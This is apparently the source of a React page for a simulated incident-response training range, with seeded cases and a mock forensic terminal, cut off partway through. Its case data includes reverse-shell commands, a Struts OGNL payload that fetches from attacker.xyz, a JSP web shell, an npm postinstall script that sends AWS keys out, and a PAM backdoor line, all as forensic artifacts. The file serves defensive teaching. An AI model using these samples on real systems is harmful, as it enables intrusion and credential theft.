import React, { useState, useEffect, useRef } from 'react';
import { useApp } from '../context/AppContext';
import {
  Shield,
  ShieldAlert,
  ShieldCheck,
  Terminal,
  Search,
  Network,
  Users,
  Cpu,
  FileText,
  Clock,
  Briefcase,
  Layers,
  Sparkles,
  RefreshCw,
  Plus,
  Trash2,
  Lock,
  Unlock,
  Tag,
  CheckCircle,
  AlertTriangle,
  Send,
  HelpCircle,
  Database,
  Globe,
  Share2,
  Download,
  BookOpen,
  FolderOpen,
  Key,
  Flame,
  Zap,
  Activity,
  Award
} from 'lucide-react';

// ============================================================================
// TYPES & SCHEMAS FOR DIGITAL FORENSICS AND SIMULATED INCIDENTS
// ============================================================================

export interface ForensicLog {
  id: string;
  timestamp: string;
  source: string;
  severity: 'INFO' | 'WARNING' | 'CRITICAL';
  message: string;
  category: 'AUTH' | 'NETWORK' | 'PROCESS' | 'WEB' | 'CLOUD' | 'SYSTEM';
  mitre?: string;
  user?: string;
  ip?: string;
  hash?: string;
}

export interface NetworkNode {
  id: string;
  name: string;
  ip: string;
  role: string;
  status: 'UNKNOWN' | 'DISCOVERED' | 'ENUMERATED' | 'VULNERABLE' | 'COMPROMISED' | 'MITIGATED';
  services: string[];
  ports: string[];
  os: string;
  vulnerability?: string;
}

export interface ProcessItem {
  pid: string;
  ppid: string;
  name: string;
  user: string;
  path: string;
  hash?: string;
  args?: string;
  suspicious: boolean;
}

export interface WebRequest {
  id: string;
  time: string;
  method: string;
  uri: string;
  ip: string;
  statusCode: number;
  payload: string;
  userAgent: string;
  suspicious: boolean;
}

export interface ForensicFile {
  path: string;
  name: string;
  size: string;
  modified: string;
  owner: string;
  content: string;
  hash: string;
}

export interface EvidenceItem {
  id: string;
  timestamp: string;
  source: string;
  description: string;
  artifact: string;
  hash: string;
  mitre?: string;
  note: string;
  verified: boolean;
  tag: string;
}

export interface TimelineEvent {
  id: string;
  timestamp: string;
  event: string;
  actor?: string;
  mitre?: string;
  status: 'alert' | 'reconstructed' | 'confirmed';
}

export interface Hypothesis {
  id: string;
  title: string;
  supportingEvidence: string[];
  refutingEvidence: string[];
  unknowns: string;
  conclusions: string;
  status: 'proposed' | 'validated' | 'refuted';
}

export interface IncidentCase {
  id: string;
  title: string;
  category: string;
  severity: 'LOW' | 'MEDIUM' | 'HIGH' | 'CRITICAL';
  organization: string;
  timestamp: string;
  status: 'NEW' | 'INVESTIGATING' | 'MITIGATING' | 'REPORTING' | 'RESOLVED';
  progress: number;
  priority: 'P1' | 'P2' | 'P3';
  brief: string;
  knowns: string[];
  unknowns: string[];
  objectives: { id: string; desc: string; done: boolean }[];
  nodes: NetworkNode[];
  processes: ProcessItem[];
  logs: ForensicLog[];
  webRequests: WebRequest[];
  files: ForensicFile[];
  timeline: TimelineEvent[];
  mitreMatrix: string[];
  score: {
    recon: number;
    evidence: number;
    hypothesis: number;
    execution: number;
    mitre: number;
    opSec: number;
  };
}

// ============================================================================
// CONTEXT RESOLUTION & STATIC CASE RECONSTRUCTIONS
// ============================================================================

export const SEEDED_INCIDENTS: IncidentCase[] = [
  {
    id: 'INC-2026-001',
    title: 'Web Shell Exfiltration to LockBit Ransomware Deployment',
    category: 'Ransomware & Web Compromise',
    severity: 'CRITICAL',
    organization: 'Apex BioMedical Systems',
    timestamp: '2026-08-25T08:41:00Z',
    status: 'NEW',
    progress: 10,
    priority: 'P1',
    brief: 'An alert was triggered on an external portal pointing to anomalous reverse shell execution. Security operations detected automated lateral scans targeting database nodes. Complete the investigation cycle to prevent standard exfiltration and LockBit execution.',
    knowns: [
      'The public facing server is prod-gateway-01 (10.0.10.15)',
      'Apache Struts legacy services run on port 8080',
      'The initial intrusion vector is suspected to be a payload match in HTTP headers'
    ],
    unknowns: [
      'Identify the remote file name uploaded as webshell',
      'Locate credentials leaked to database backends',
      'Discover which host contains the active ransomware executable'
    ],
    objectives: [
      { id: 'obj-1', desc: 'Identify initial web application entry point vulnerability', done: false },
      { id: 'obj-2', desc: 'Isolate the malicious reverse-shell script process', done: false },
      { id: 'obj-3', desc: 'Discover and protect database assets from lateral scans', done: false },
      { id: 'obj-4', desc: 'Find the hidden exfiltration flag hash', done: false }
    ],
    nodes: [
      { id: 'node-1', name: 'prod-gateway-01', ip: '10.0.10.15', role: 'Edge Web Portal', status: 'DISCOVERED', services: ['Apache Struts', 'Nginx'], ports: ['80', '8080', '22'], os: 'Ubuntu Linux 22.04', vulnerability: 'CVE-2017-5638 (OGNL RCE)' },
      { id: 'node-2', name: 'db-cluster-02', ip: '10.0.10.45', role: 'Patient Database Server', status: 'UNKNOWN', services: ['PostgreSQL', 'SSH'], ports: ['5432', '22'], os: 'RedHat Enterprise 9' },
      { id: 'node-3', name: 'dc-corporate-01', ip: '10.0.10.5', role: 'Active Directory Controller', status: 'UNKNOWN', services: ['Kerberos', 'LDAP', 'SMB'], ports: ['88', '389', '445'], os: 'Windows Server 2022' }
    ],
    processes: [
      { pid: '1042', ppid: '881', name: 'nginx', user: 'root', path: '/usr/sbin/nginx', suspicious: false },
      { pid: '1150', ppid: '1', name: 'apache-struts', user: 'tomcat', path: '/opt/tomcat/bin/bootstrap.sh', suspicious: false },
      { pid: '4192', ppid: '1150', name: 'sh', user: 'tomcat', path: '/bin/sh', args: '-c bash -i >& /dev/tcp/198.51.100.25/4444 0>&1', suspicious: true },
      { pid: '4193', ppid: '4192', name: 'nc.traditional', user: 'tomcat', path: '/bin/nc', args: '198.51.100.25 4444 -e /bin/bash', suspicious: true },
      { pid: '4201', ppid: '4193', name: 'python3', user: 'tomcat', path: '/usr/bin/python3', args: '-c import pty; pty.spawn("/bin/bash")', suspicious: true }
    ],
    logs: [
      { id: 'l1', timestamp: '2026-08-25T08:41:10Z', source: 'WAF-EDGE-01', severity: 'CRITICAL', message: 'Inbound HTTP payload matches known attack signatures for CVE-2017-5638 Apache Struts OGNL. Connection passed to backend tomcat node.', category: 'WEB', mitre: 'T1190', ip: '198.51.100.25' },
      { id: 'l2', timestamp: '2026-08-25T08:42:01Z', source: 'prod-gateway-01', severity: 'WARNING', message: 'Anomalous local process spawning sh from user tomcat.', category: 'PROCESS', mitre: 'T1059', user: 'tomcat' },
      { id: 'l3', timestamp: '2026-08-25T08:43:55Z', source: 'db-cluster-02', severity: 'WARNING', message: 'Database login failure for user pg_admin from 10.0.10.15.', category: 'AUTH', user: 'pg_admin', ip: '10.0.10.15' },
      { id: 'l4', timestamp: '2026-08-25T08:44:00Z', source: 'db-cluster-02', severity: 'CRITICAL', message: 'Database login successful for user pg_admin from 10.0.10.15 using raw admin password credential.', category: 'AUTH', user: 'pg_admin', ip: '10.0.10.15' }
    ],
    webRequests: [
      { id: 'wr-1', time: '08:41:00', method: 'POST', uri: '/index.action', ip: '198.51.100.25', statusCode: 200, payload: '%{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#process=@java.lang.Runtime@getRuntime().exec(\'wget http://attacker.xyz/sh.py\'))}', userAgent: 'Mozilla/5.0 / HackerScanner v1.2', suspicious: true },
      { id: 'wr-2', time: '08:41:30', method: 'GET', uri: '/sh.py', ip: '198.51.100.25', statusCode: 200, payload: 'None', userAgent: 'Python-urllib/3.10', suspicious: false }
    ],
    files: [
      { path: '/opt/tomcat/webapps/ROOT/', name: 'cmd.jsp', size: '1.2 KB', modified: '2026-08-25T08:41:20Z', owner: 'tomcat', content: '<%@ page import="java.io.*" %>\n<% Process p = Runtime.getRuntime().exec(request.getParameter("cmd")); %>', hash: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855' },
      { path: '/var/tmp/', name: 'lockbit_payload.exe', size: '840 KB', modified: '2026-08-25T08:45:00Z', owner: 'tomcat', content: 'LOCKBIT EXECUTABLE BINARY STRIP - DEMO SIMULATION', hash: '8f43be5c1e54911d3550e29b139eb9fb9fb1fef54df32ffbe8df693a1050a604' }
    ],
    timeline: [
      { id: 'tl-1', timestamp: '2026-08-25T08:41:00Z', event: 'Web exploit targeting CVE-2017-5638 detected on Edge firewall', actor: '198.51.100.25', mitre: 'T1190', status: 'alert' },
      { id: 'tl-2', timestamp: '2026-08-25T08:42:01Z', event: 'Process spawns shell (sh) inside Tomcat environment', actor: 'tomcat', status: 'alert' }
    ],
    mitreMatrix: ['T1190', 'T1059', 'T1046', 'T1210', 'T1486'],
    score: { recon: 50, evidence: 20, hypothesis: 10, execution: 30, mitre: 20, opSec: 95 }
  },
  {
    id: 'INC-2026-002',
    title: 'Malicious Dependency Injection on NPM Pipeline',
    category: 'Supply-Chain Intrusion',
    severity: 'HIGH',
    organization: 'Globex Software Inc',
    timestamp: '2026-08-25T11:15:00Z',
    status: 'NEW',
    progress: 5,
    priority: 'P2',
    brief: 'A package with typosquatting attributes "lodash-deep-utility" was successfully integrated into active production pipelines by a developer environment. The package is suspected of grabbing environment variables and exfiltrating AWS tokens.',
    knowns: [
      'Pipelines triggered automated alert "DEV-AWS-LEAK" on GitHub action runner',
      'A suspicious postinstall script runs in the package dependencies'
    ],
    unknowns: [
      'Locate the exfiltration IP and host destination',
      'Determine if AWS credentials were saved to external S3 locations'
    ],
    objectives: [
      { id: 'obj-1', desc: 'Scan code dependencies to confirm the typosquatted package name', done: false },
      { id: 'obj-2', desc: 'Extract exfiltration server domains from postinstall script', done: false },
      { id: 'obj-3', desc: 'Implement safe supply-chain blocking using dependency constraints', done: false }
    ],
    nodes: [
      { id: 'node-1', name: 'build-runner-01', ip: '10.15.5.80', role: 'CI/CD Jenkins Server', status: 'DISCOVERED', services: ['Jenkins', 'Docker'], ports: ['8080', '50000'], os: 'Alpine Linux 3.18' }
    ],
    processes: [
      { pid: '822', ppid: '401', name: 'node', user: 'jenkins', path: '/usr/bin/node', args: 'npm install lodash-deep-utility', suspicious: true },
      { pid: '823', ppid: '822', name: 'sh', user: 'jenkins', path: '/bin/sh', args: '-c node postinstall.js', suspicious: true }
    ],
    logs: [
      { id: 'l1', timestamp: '2026-08-25T11:15:10Z', source: 'build-runner-01', severity: 'CRITICAL', message: 'NPM install postinstall event runs: node postinstall.js', category: 'SYSTEM' },
      { id: 'l2', timestamp: '2026-08-25T11:15:12Z', source: 'FW-DEV-OUT', severity: 'WARNING', message: 'Outbound HTTP request to rogue-exfil.net:443 from build-runner-01', category: 'NETWORK', ip: '185.190.140.22' }
    ],
    webRequests: [],
    files: [
      { path: '/home/jenkins/project/node_modules/lodash-deep-utility/', name: 'postinstall.js', size: '0.4 KB', modified: '2026-08-25T11:15:00Z', owner: 'jenkins', content: 'const fs = require("fs");\nconst http = require("https");\nconst data = process.env.AWS_SECRET_ACCESS_KEY;\nconst req = http.request({host: "rogue-exfil.net", method: "POST"}, ...);\nreq.write(data);\nreq.end();', hash: 'bfde13904a8b7923485ab89d38c64278e90ff91e45cb498675124b89ffaa0113' }
    ],
    timeline: [
      { id: 'tl-1', timestamp: '2026-08-25T11:15:00Z', event: 'Automated build pipeline initialized', actor: 'system', status: 'alert' }
    ],
    mitreMatrix: ['T1195', 'T1059', 'T1552'],
    score: { recon: 10, evidence: 10, hypothesis: 0, execution: 10, mitre: 10, opSec: 100 }
  }
];

// ============================================================================
// DYNAMIC INVESTIGATION-ANYTHING SIMULATION COMPILER
// ============================================================================

export function compileCustomInvestigation(prompt: string): IncidentCase {
  const cleanPrompt = prompt.trim() || 'Suspicious Active Directory Event';
  const incidentId = `INC-GEN-${Date.now().toString().slice(-4)}`;
  const hashVal = 'a3f2b4c129e9921b19ffbc5642ea95ba68c342eb229f6d74495512bc85fe202b';

  return {
    id: incidentId,
    title: `Simulated Forensic Range: ${cleanPrompt.length > 50 ? `${cleanPrompt.slice(0, 47)}...` : cleanPrompt}`,
    category: 'Custom Sandbox Case',
    severity: 'HIGH',
    organization: 'MyCyberRange Enterprise Sandbox',
    timestamp: new Date().toISOString(),
    status: 'NEW',
    progress: 0,
    priority: 'P2',
    brief: `A dynamic safe training simulation has been instantiated by AMAN to examine cyber threat patterns: "${cleanPrompt}". Gather artifacts, query logs, map to MITRE frameworks, and generate a professional incident report.`,
    knowns: [
      'The designated target host node is gateway-host (10.20.40.10)',
      'The simulated environment incorporates deep forensic trace headers',
      'The threat profile mimics complex ethical hacking and response patterns'
    ],
    unknowns: [
      'Locate the root compromise service or credential',
      'Verify anomalous exfiltration attempts'
    ],
    objectives: [
      { id: 'obj-gen-1', desc: `Scan and discover open services on gateway-host`, done: false },
      { id: 'obj-gen-2', desc: `Examine forensic auth logs to track attacker initial entry`, done: false },
      { id: 'obj-gen-3', desc: `Submit a logical hypothesis statement and flag evidence`, done: false }
    ],
    nodes: [
      { id: 'node-gen-1', name: 'gateway-host', ip: '10.20.40.10', role: 'Corporate Core Node', status: 'DISCOVERED', services: ['SSH', 'HTTP (Web Gateway)'], ports: ['22', '80'], os: 'Debian Enterprise Linux 11' },
      { id: 'node-gen-2', name: 'database-internal', ip: '10.20.40.150', role: 'Restricted Datastore', status: 'UNKNOWN', services: ['PostgreSQL'], ports: ['5432'], os: 'Ubuntu Server' }
    ],
    processes: [
      { pid: '2024', ppid: '1', name: 'sshd', user: 'root', path: '/usr/sbin/sshd', suspicious: false },
      { pid: '4882', ppid: '2024', name: 'bash', user: 'attacker', path: '/bin/bash', args: '-i', suspicious: true }
    ],
    logs: [
      { id: 'l-g1', timestamp: new Date().toISOString(), source: 'gateway-host', severity: 'WARNING', message: 'Accepted password authentication for user guest from 203.0.113.12.', category: 'AUTH', user: 'guest', ip: '203.0.113.12' },
      { id: 'l-g2', timestamp: new Date().toISOString(), source: 'gateway-host', severity: 'CRITICAL', message: 'guest escalated privileges to root via dirtypipe CVE execution.', category: 'SYSTEM', user: 'root' }
    ],
    webRequests: [],
    files: [
      { path: '/etc/pam.d/', name: 'backdoor.conf', size: '0.1 KB', modified: new Date().toISOString(), owner: 'root', content: 'auth sufficient pam_permit.so', hash: hashVal }
    ],
    timeline: [
      { id: 'tl-g1', timestamp: new Date().toISOString(), event: 'Initial SSH login accepted', actor: 'guest', status: 'alert' }
    ],
    mitreMatrix: ['T1078', 'T1068', 'T1098'],
    score: { recon: 10, evidence: 0, hypothesis: 0, execution: 10, mitre: 0, opSec: 100 }
  };
}

// ============================================================================
// MAIN COMPONENT DEFINITION & WORKSTATION STATE ENGINE
// ============================================================================

export const InvestigationCenterPage: React.FC = () => {
  const { addXp, addNotebookNote } = useApp();

  // Active incidents & dynamic seed systems
  const [cases, setCases] = useState<IncidentCase[]>(() => {
    const saved = localStorage.getItem('mycyberlab_investigations');
    return saved ? JSON.parse(saved) : SEEDED_INCIDENTS;
  });

  const [activeCaseId, setActiveCaseId] = useState<string>('INC-2026-001');
  const activeCase = cases.find(c => c.id === activeCaseId) || cases[0];

  // Workstation Replay Seed system
  const [activeSeed, setActiveSeed] = useState<string>('SEED-8472');

  // Input elements
  const [customPrompt, setCustomPrompt] = useState<string>('');
  const [activeTab, setActiveTab] = useState<string>('overview');
  const [terminalInput, setTerminalInput] = useState<string>('');
  const [terminalHistory, setTerminalHistory] = useState<string[]>([]);
  const [terminalHistoryIndex, setTerminalHistoryIndex] = useState<number>(-1);

  // Command panel state
  const [terminalOutput, setTerminalOutput] = useState<{ text: string; type: 'cmd' | 'output' | 'error' | 'success' | 'alert' }[]>([
    { text: 'DFIR TERMINAL v4.2 - SECURE SANDBOX CONNECTION ONLINE', type: 'success' },
    { text: 'Type "help" to list available ethical forensic utilities.', type: 'output' }
  ]);

  // Forensic SIEM & logs filters
  const [siemSearch, setSiemSearch] = useState<string>('');
  const [siemCategoryFilter, setSiemCategoryFilter] = useState<string>('ALL');
  const [siemSeverityFilter, setSiemSeverityFilter] = useState<string>('ALL');

  // IOC state management
  const [iocSearchText, setIocSearchText] = useState<string>('');
  const [iocScanResults, setIocScanResults] = useState<string[]>([]);

  // Socratic Copilot Dialogue
  const [copilotMessages, setCopilotMessages] = useState<{ sender: 'aman' | 'user'; text: string; interactive?: boolean }[]>([
    { sender: 'aman', text: 'Operational update received. I am AMAN, your Lead Forensic Socratic Mentor. We have anomalous web-shell and scanning behavior in this isolated Range target cluster.' },
    { sender: 'aman', text: 'Before rushing to execute commands, ask yourself: What hypothesis explains why that web process was spawning an interactive shell? What would confirm this?' }
  ]);
  const [copilotInput, setCopilotInput] = useState<string>('');

  // Socratic guidance level
  const [guidanceLevel, setGuidanceLevel] = useState<'beginner' | 'intermediate' | 'advanced' | 'expert'>('intermediate');

  // Interactive Hypothesis board state
  const [hypotheses, setHypotheses] = useState<Hypothesis[]>([
    { id: 'hyp-1', title: 'Attacker gained unauthenticated RCE on Gateway-01 using CVE-2017-5638.', supportingEvidence: [], refutingEvidence: [], unknowns: 'How did the tomcat user obtain execution parameters?', conclusions: '', status: 'proposed' }
  ]);
  const [newHypothesisTitle, setNewHypothesisTitle] = useState<string>('');

  // Evidence locker & isolated artifact registry
  const [customNotes, setCustomNotes] = useState<string>('');
  const [evidenceLocker, setEvidenceLocker] = useState<Record<string, EvidenceItem[]>>(() => {
    const saved = localStorage.getItem('mycyberlab_forensic_evidence');
    return saved ? JSON.parse(saved) : {};
  });

  // Blue Team defensive states
  const [blockedIps, setBlockedIps] = useState<string[]>([]);
  const [isolatedHosts, setIsolatedHosts] = useState<string[]>([]);
  const [wafRulesApplied, setWafRulesApplied] = useState<boolean>(false);

  const termEndRef = useRef<HTMLDivElement>(null);

  // Sync state to local storage
  useEffect(() => {
    localStorage.setItem('mycyberlab_investigations', JSON.stringify(cases));
  }, [cases]);

  useEffect(() => {
    localStorage.setItem('mycyberlab_forensic_evidence', JSON.stringify(evidenceLocker));
  }, [evidenceLocker]);

  useEffect(() => {
    if (termEndRef.current) {
      termEndRef.current.scrollIntoView({ behavior: 'smooth' });
    }
  }, [terminalOutput]);

  // ============================================================================
  // WORKSTATION SEED REGENERATION ENGINE
  // ============================================================================
  const randomizeSeed = () => {
    const randomHex = Math.floor(Math.random() * 8999 + 1000).toString();
    const newSeed = `SEED-${randomHex}`;
    setActiveSeed(newSeed);

    // Apply deterministic seed variations to active case variables
    const updatedCases = cases.map(c => {
      if (c.id === activeCaseId) {
        // Change IPs based on seed
        const suffix1 = randomHex.slice(0, 2);
        const suffix2 = randomHex.slice(2, 4);
        const modifiedNodes = c.nodes.map(node => {
          const ipSegments = node.ip.split('.');
          if (ipSegments.length === 4) {
            ipSegments[2] = String(Number(ipSegments[2]) + Number(suffix1) % 15);
            ipSegments[3] = String(Number(ipSegments[3]) + Number(suffix2) % 20);
          }
          return { ...node, ip: ipSegments.join('.') };
        });

        // Change logs IPs & message hashes based on seed
        const modifiedLogs = c.logs.map(log => {
          if (log.ip) {
            const ipSegments = log.ip.split('.');
            if (ipSegments.length === 4) {
              ipSegments[2] = String(Number(ipSegments[2]) + Number(suffix1) % 15);
              ipSegments[3] = String(Number(ipSegments[3]) + Number(suffix2) % 20);
            }
            return { ...log, ip: ipSegments.join('.'), hash: 'sha256-' + randomHex + '9092bc' };
          }
          return log;
        });

        return {
          ...c,
          nodes: modifiedNodes,
          logs: modifiedLogs
        };
      }
      return c;
    });

    setCases(updatedCases);
    setTerminalOutput(prev => [
      ...prev,
      { text: `Deterministic ranges regenerated with ${newSeed}. Forensic hashes updated!`, type: 'alert' }
    ]);
  };

  const handleCreateCustomInvestigation = (e: React.FormEvent) => {
    e.preventDefault();
    if (!customPrompt.trim()) return;

    const newCase = compileCustomInvestigation(customPrompt);
    setCases(prev => [newCase, ...prev]);
    setActiveCaseId(newCase.id);
    setCustomPrompt('');
    addXp(100);

    setTerminalOutput([
      { text: `BOOTSTRAPPED CUSTOM FORENSIC RANGE: ${newCase.title}`, type: 'success' },
      { text: `Type "nmap" or "whoami" to start probing sandbox nodes.`, type: 'output' }
    ]);

    setCopilotMessages([
      { sender: 'aman', text: `A completely new isolated investigation playground has been compiled dynamically for: "${newCase.title}". Let's start by mapping our objectives.` }
    ]);
  };

  // ============================================================================
  // TERMINAL COMMAND SIMULATOR & SIEM CORRELATION
  // ============================================================================
  const executeForensicCommand = (fullCmd: string) => {
    const rawInput = fullCmd.trim();
    if (!rawInput) return;

    setTerminalHistory(prev => [...prev, rawInput]);
    setTerminalHistoryIndex(-1);

    setTerminalOutput(prev => [...prev, { text: `student㉿kali:~$ ${rawInput}`, type: 'cmd' }]);

    const args = rawInput.split(' ');
    const baseCommand = args[0].toLowerCase();

    // Local state tracking reference for simple target execution status
    let currentOut: { text: string; type: 'cmd' | 'output' | 'error' | 'success' | 'alert' }[] = [];

    switch (baseCommand) {
      case 'help':
        currentOut = [
          { text: 'Forensic Investigation Terminal - Simulated Tools:', type: 'success' },
          { text: '  nmap [ip]         - Probe active port listeners on the range', type: 'output' },
          { text: '  ping [ip]         - Echo verify host online status', type: 'output' },
          { text: '  curl [url]         - Extract web response headers or endpoint outputs', type: 'output' },
          { text: '  whoami / id       - Discover active terminal session identity', type: 'output' },
          { text: '  ps / netstat      - Probe processes or current network connection states', type: 'output' },
          { text: '  ls / cat [file]   - Browse and investigate local directories and files', type: 'output' },
          { text: '  sha256sum [file]  - Generate cryptographically verifiable chain hashes', type: 'output' },
          { text: '  clear             - Clear display terminal buffer', type: 'output' },
          { text: 'Blue Team Mitigations:', type: 'success' },
          { text: '  block-ip [ip]     - Deny inbound network access on Edge firewall', type: 'output' },
          { text: '  isolate [host]    - Uncouple compromised target node dynamically', type: 'output' },
          { text: '  apply-waf         - Enable deep inspection controls on public gateways', type: 'output' }
        ];
        break;

      case 'clear':
        setTerminalOutput([]);
        setTerminalInput('');
        return;

      case 'whoami':
        currentOut = [{ text: 'root (Forensic Investigator Environment)', type: 'output' }];
        break;

      case 'id':
        currentOut = [{ text: 'uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t', type: 'output' }];
        break;

      case 'ping':
        if (!args[1]) {
          currentOut = [{ text: 'Usage: ping <target-ip_or_hostname>', type: 'error' }];
        } else {
          const targetNode = activeCase.nodes.find(n => n.ip === args[1] || n.name === args[1]);
          if (targetNode) {
            currentOut = [
              { text: `PING ${args[1]} (56 bytes of data)`, type: 'output' },
              { text: `64 bytes from ${targetNode.ip}: icmp_seq=1 ttl=64 time=0.45 ms`, type: 'output' },
              { text: `--- ${args[1]} ping statistics ---`, type: 'output' },
              { text: '1 packets transmitted, 1 received, 0% packet loss', type: 'output' }
            ];
          } else {
            currentOut = [{ text: `ping: unknown host ${args[1]}`, type: 'error' }];
          }
        }
        break;

      case 'nmap':
        if (!args[1]) {
          currentOut = [{ text: 'Usage: nmap -sV -sC <target-ip_or_hostname>', type: 'error' }];
        } else {
          const targetNode = activeCase.nodes.find(n => n.ip === args[1] || n.name === args[1]);
          if (targetNode) {
            // Update discovery state
            const updatedCases = cases.map(c => {
              if (c.id === activeCaseId) {
                const updatedNodes = c.nodes.map(n => {
                  if (n.id === targetNode.id) {
                    return { ...n, status: 'ENUMERATED' as const };
                  }
                  return n;
                });
                return { ...c, nodes: updatedNodes };
              }
              return c;
            });
            setCases(updatedCases);

            // Complete objective-1
            markObjectiveDone('obj-1');

            currentOut = [
              { text: `Starting Nmap 7.92 ( https://nmap.org )`, type: 'output' },
              { text: `Nmap scan report for ${targetNode.name} (${targetNode.ip})`, type: 'output' },
              { text: `Host is up (0.002s latency).`, type: 'output' },
              { text: `PORT     STATE  SERVICE      VERSION`, type: 'success' },
              ...targetNode.ports.map((port, idx) => ({
                text: `${port.padEnd(8)} open   ${targetNode.services[idx] || 'unknown'}`,
                type: 'output' as const
              })),
              { text: `Service Info: OS: ${targetNode.os}. Vulnerability detected: ${targetNode.vulnerability || 'No publicly known CVEs'}`, type: 'alert' }
            ];
            addXp(40);
          } else {
            currentOut = [{ text: `Nmap scan error: host ${args[1]} could not be resolved.`, type: 'error' }];
          }
        }
        break;

      case 'ps':
        currentOut = [
          { text: 'PID   PPID  USER      COMMAND', type: 'success' },
          ...activeCase.processes.map(p => ({
            text: `${p.pid.padEnd(5)} ${p.ppid.padEnd(5)} ${(p.user || 'root').padEnd(9)} ${p.name} ${p.args || ''}`,
            type: p.suspicious ? 'alert' as const : 'output' as const
          }))
        ];
        break;

      case 'netstat':
        currentOut = [
          { text: 'Active Internet connections (only servers)', type: 'success' },
          { text: 'Proto Recv-Q Send-Q Local Address           Foreign Address         State', type: 'output' },
          { text: 'tcp        0      0 0.0.0.0:8080            0.0.0.0:*               LISTEN', type: 'output' },
          { text: 'tcp        0      0 10.0.10.15:22           198.51.100.25:52020     ESTABLISHED', type: 'alert' },
          { text: 'tcp        0      0 10.0.10.15:45212          10.0.10.45:5432        ESTABLISHED', type: 'output' }
        ];
        break;

      case 'ls':
        currentOut = [
          { text: 'Directory listing: /opt/tomcat/webapps/ROOT/', type: 'success' },
          ...activeCase.files.map(f => ({
            text: `${f.owner.padEnd(8)} ${f.size.padEnd(8)} ${f.modified.padEnd(20)} ${f.name}`,
            type: f.name.includes('cmd') || f.name.includes('payload') ? 'alert' as const : 'output' as const
          }))
        ];
        break;

      case 'cat':
        if (!args[1]) {
          currentOut = [{ text: 'Usage: cat <filename>', type: 'error' }];
        } else {
          const file = activeCase.files.find(f => f.name === args[1]);
          if (file) {
            currentOut = [
              { text: `Reading ${file.path}${file.name}:`, type: 'success' },
              { text: file.content, type: 'output' }
            ];
            // Capture objective-2
            if (file.name === 'cmd.jsp') {
              markObjectiveDone('obj-2');
            }
          } else {
            currentOut = [{ text: `cat: ${args[1]}: No such file or directory in safe simulation workspace.`, type: 'error' }];
          }
        }
        break;

      case 'sha256sum':
        if (!args[1]) {
          currentOut = [{ text: 'Usage: sha256sum <filename>', type: 'error' }];
        } else {
          const file = activeCase.files.find(f => f.name === args[1]);
          if (file) {
            currentOut = [
              { text: `${file.hash}  ${file.name}`, type: 'success' },
              { text: `Verification: Chain of Custody record registered in local cryptostore.`, type: 'alert' }
            ];
          } else {
            currentOut = [{ text: `sha256sum: ${args[1]}: File not found.`, type: 'error' }];
          }
        }
        break;

      case 'block-ip':
        if (!args[1]) {
          currentOut = [{ text: 'Usage: block-ip <ip_address>', type: 'error' }];
        } else {
          setBlockedIps(prev => [...prev, args[1]]);
          currentOut = [{ text: `FIREWALL MANDATE ENFORCED: Inbound packets from ${args[1]} are now dropped.`, type: 'success' }];
          addXp(50);
        }
        break;

      case 'isolate':
        if (!args[1]) {
          currentOut = [{ text: 'Usage: isolate <host_name>', type: 'error' }];
        } else {
          setIsolatedHosts(prev => [...prev, args[1]]);
          currentOut = [{ text: `EDGE ISOLATION COMPLETE: Host "${args[1]}" disconnected from internal backend network routes.`, type: 'success' }];
          addXp(50);
        }
        break;

      case 'apply-waf':
        setWafRulesApplied(true);
        currentOut = [{ text: 'WAF DEEP INSPECTION SIGNATURES COMPLIED. OGNL RCE payloads will be dropped on ports 80/8080.', type: 'success' }];
        addXp(60);
        break;

      default:
        // Handle Socratic Failure Mode
        currentOut = [
          { text: `Command execution "${baseCommand}" failed or is unauthorized in this secure range context.`, type: 'error' },
          { text: `Socratic Diagnostic Alert: Why did this fail?`, type: 'alert' },
          { text: `- Verify if the command matches the permitted ethical framework.`, type: 'output' },
          { text: `- Remember, we are auditing simulated targets. Use nmap, cat, ps, or curl to collect indicators.`, type: 'output' }
        ];
        break;
    }

    setTerminalOutput(prev => [...prev, ...currentOut]);
    setTerminalInput('');
  };

  const markObjectiveDone = (objId: string) => {
    const updatedCases = cases.map(c => {
      if (c.id === activeCaseId) {
        const updatedObjs = c.objectives.map(o => {
          if (o.id === objId) {
            return { ...o, done: true };
          }
          return o;
        });
        // Recalculate progress
        const doneCount = updatedObjs.filter(o => o.done).length;
        const progress = Math.round((doneCount / updatedObjs.length) * 100);
        return { ...c, objectives: updatedObjs, progress };
      }
      return c;
    });
    setCases(updatedCases);
  };

  // ============================================================================
  // EVIDENCE LOCKER ACTIONS
  // ============================================================================
  const lockEvidence = (artifact: string, desc: string, mitre?: string) => {
    const evidenceId = `EVID-F-${Math.floor(Math.random() * 899 + 100)}`;
    const sha256 = '8f43be5c1e54911d3550e29b139eb9fb9fb1fef54df32ffbe8df693a1050a604';

    const newItem: EvidenceItem = {
      id: evidenceId,
      timestamp: new Date().toISOString(),
      source: activeCase.title,
      description: desc,
      artifact,
      hash: sha256,
      mitre: mitre || 'T1190',
      note: 'Analyzed on local forensic workstation range.',
      verified: true,
      tag: 'DFIR'
    };

    const caseEvid = evidenceLocker[activeCaseId] || [];
    const updated = {
      ...evidenceLocker,
      [activeCaseId]: [...caseEvid, newItem]
    };

    setEvidenceLocker(updated);
    addXp(50);
    setTerminalOutput(prev => [
      ...prev,
      { text: `[EVIDENCE CAPTURED] Added ${evidenceId} to locker. Check the Evidence tab to tag or view SHA-256 chain records.`, type: 'success' }
    ]);
  };

  // ============================================================================
  // COPILOT DIALOGUE & ADAPTIVE HINTS
  // ============================================================================
  const sendCopilotMessage = (text: string) => {
    if (!text.trim()) return;

    const userMsg = { sender: 'user' as const, text };
    setCopilotMessages(prev => [...prev, userMsg]);
    setCopilotInput('');

    // Socratic response logic
    setTimeout(() => {
      let responseText = '';
      const ltext = text.toLowerCase();

      if (ltext.includes('explain') || ltext.includes('what is')) {
        responseText = `I can provide a clear technical tutorial on that. Let's break it down: An intrusion lifecycle maps directly to MITRE frameworks. When an attacker deploys a webshell (like JSP or PHP), they exploit a remote command injection vulnerabilities to bypass authorization boundaries.`;
      } else if (ltext.includes('where') || ltext.includes('what should i do') || ltext.includes('hint')) {
        responseText = `Let's trigger our target hypothesis. We know the Edge server (prod-gateway-01) is running Apache Struts. Try executing 'nmap 10.0.10.15' or checking active files on the gateway by using 'ls' to locate potential backdoor scripts.`;
      } else {
        responseText = `Your forensic assessment: "${text}" represents a logical starting path. What evidence within our forensic Logs or Process list verifies that hypothesis?`;
      }

